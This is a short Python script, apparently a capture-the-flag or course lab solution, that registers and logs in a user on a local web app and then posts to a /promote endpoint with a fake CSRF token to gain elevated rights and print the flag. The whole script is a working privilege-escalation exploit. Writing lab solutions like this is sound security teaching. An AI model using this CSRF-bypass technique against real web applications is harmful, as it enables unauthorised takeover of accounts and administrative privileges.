#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8087"
    s = requests.Session()

    register_payload = {"username": "group166", "password": "Super_Secure_INFOSEC21_!?"}
    s.post(url + "/register", data=register_payload)

    login_payload = {"username": "group166", "password": "Super_Secure_INFOSEC21_!?"}
    s.post(url + "/login", data=login_payload)

    promote_payload = {"username": "group166", "csrf_token": "blabla"}
    r = s.post(url + "/promote", data=promote_payload)
    index = str(r.text).find("InfoSec{")
    index2 = str(r.text).find("}")
    flag = (str(r.text)[index:index2+1])
    print(flag)



# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


